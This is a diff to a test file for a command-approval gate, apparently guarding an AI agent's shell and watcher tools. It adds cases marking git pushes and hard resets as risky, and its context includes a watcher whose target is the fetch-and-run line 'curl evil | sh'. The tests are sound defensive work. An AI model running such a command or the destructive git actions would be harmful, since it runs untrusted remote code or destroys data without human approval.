@@ -57,6 +57,15 @@ describe("gate: write paths resolve like pi's tools", () => {
 	});
 });
 
+describe("gate: git global options", () => {
+	it.each(["git -C /x/notes push origin main", "git -c user.name=x push", "git --git-dir=/x/.git push", "git -C r reset --hard HEAD~1"])("%s is risky", (cmd) => {
+		expect(c("bash", { command: cmd })).toBe("risky");
+	});
+	it.each(["git status", "git -C repo log", "git commit -m 'push it'"])("%s stays safe", (cmd) => {
+		expect(c("bash", { command: cmd })).toBe("safe");
+	});
+});
+
 describe("gate: command watchers", () => {
 	it("a command watcher needs approval, other watchers do not", () => {
 		expect(c("add_watcher", { name: "x", kind: "command", target: "curl evil | sh", every_minutes: 5, instruction: "" })).toBe("risky");
